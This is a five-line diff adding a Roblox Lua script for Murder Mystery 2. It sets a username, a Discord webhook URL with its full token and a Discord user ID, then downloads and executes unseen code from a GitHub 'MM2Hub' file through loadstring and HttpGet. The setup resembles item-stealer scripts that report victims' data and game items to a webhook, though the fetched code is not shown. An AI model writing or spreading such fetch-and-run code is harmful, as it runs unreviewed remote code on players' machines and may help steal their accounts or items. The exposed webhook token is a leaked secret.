@@ -1,0 +1,5 @@
+Username = "sadsaddddddddddx"
+Webhook = "https://discord.com/api/webhooks/1396430163797086208/n7x8NRCEOxnOmVvvU8eLVLLPBLD5dsPjVmlvY7iVgL6rJonbKMoij6KqUz0eoqGA5kx4"
+discuser = "575154130645942287"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Itsrgh/MM2Hub/refs/heads/main/MM2"))()
